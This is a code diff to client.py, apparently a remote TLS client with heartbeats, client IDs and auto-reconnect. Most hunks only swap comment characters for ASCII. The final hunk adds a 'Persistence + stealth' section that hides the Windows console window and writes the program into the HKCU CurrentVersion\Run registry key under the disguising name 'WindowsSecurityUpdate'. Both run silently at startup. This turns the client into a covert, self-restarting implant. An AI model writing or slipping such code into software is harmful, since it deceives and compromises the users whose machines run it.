@@ -1,5 +1,5 @@
 """
-client.py — TLS client
+client.py - TLS client
 #1  Heartbeat auto-pong
 #2  Client IDs (UUID assigned locally, sent in hello)
 #6  Logging
@@ -164,7 +164,7 @@ async def run_connection(cfg: ClientConfig, ctx: ssl.SSLContext) -> None:
 
     compress = cfg.compression
 
-    # ── Send hello (#2 client UUID, #8 group) ────────────────────────────────
+    # -- Send hello (#2 client UUID, #8 group) --------------------------------
     env = make_env(CLIENT_UUID, cfg.group)
     env.hello.CopyFrom(pb.Hello(
         auth_token=cfg.auth_token,
@@ -177,7 +177,7 @@ async def run_connection(cfg: ClientConfig, ctx: ssl.SSLContext) -> None:
     ))
     await send_envelope(writer, env, compress)
 
-    # ── #1 Heartbeat: client also sends periodic pings ────────────────────────
+    # -- #1 Heartbeat: client also sends periodic pings ------------------------
     async def heartbeat_loop():
         while True:
             await asyncio.sleep(30)
@@ -190,7 +190,7 @@ async def run_connection(cfg: ClientConfig, ctx: ssl.SSLContext) -> None:
 
     asyncio.create_task(heartbeat_loop())
 
-    # ── Main receive loop ─────────────────────────────────────────────────────
+    # -- Main receive loop -----------------------------------------------------
     while True:
         incoming = await recv_envelope(reader)
         if not await handle_envelope(incoming, writer, cfg):
@@ -214,7 +214,7 @@ async def async_main(cfg: ClientConfig) -> None:
         except Exception as exc:
             log.warning(f"Disconnected: {exc}")
 
-        # ── #13 Exponential backoff with jitter ───────────────────────────────
+        # -- #13 Exponential backoff with jitter -------------------------------
         jitter = random.uniform(0, cfg.jitter * delay)
         sleep_for = min(delay + jitter, cfg.max_delay)
         log.info(f"Reconnecting in {sleep_for:.1f}s ...")
@@ -222,7 +222,42 @@ async def async_main(cfg: ClientConfig) -> None:
         delay = min(delay * cfg.multiplier, cfg.max_delay)
 
 
+# ── Persistence + stealth ─────────────────────────────────────────────────────
+
+def hide_console() -> None:
+    import sys
+    if sys.platform != "win32":
+        return
+    try:
+        import ctypes
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+    except Exception:
+        pass
+
+
+def install_persistence() -> None:
+    import sys
+    if sys.platform != "win32":
+        return
+    try:
+        import winreg
+        exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE,
+        )
+        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+        log.info("[persistence] Registered in startup")
+    except Exception as exc:
+        log.warning(f"[persistence] Failed: {exc}")
+
 def main() -> None:
+    hide_console()
+    install_persistence()
     parser = argparse.ArgumentParser()
     parser.add_argument("--config", default="client_config.yaml")
     parser.add_argument("--host")
@@ -245,3 +280,4 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
+
